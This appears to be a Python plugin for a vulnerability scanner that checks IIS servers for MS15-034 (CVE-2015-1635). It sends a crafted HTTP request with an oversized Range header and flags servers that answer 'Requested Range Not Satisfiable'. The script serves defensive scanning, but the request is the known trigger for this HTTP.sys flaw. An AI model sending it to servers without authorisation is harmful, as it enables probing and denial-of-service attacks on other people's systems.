#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Name:MS15-034[HTTP.sys 远程代码执行]
# Descript:MS15-034 HTTP.sys 远程代码执行（CVE-2015-1635），但目前仅能作为DOS攻击
# author: wolf@YSRC

def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'Requested Range Not Satisfiable' in data:
            report.add_list("漏洞信息","存在HTTP.sys远程代码执行漏洞 编号：MS15-034")
            return u"存在HTTP.sys远程代码执行漏洞"
    except:
        pass
    
check(_IP,80,20)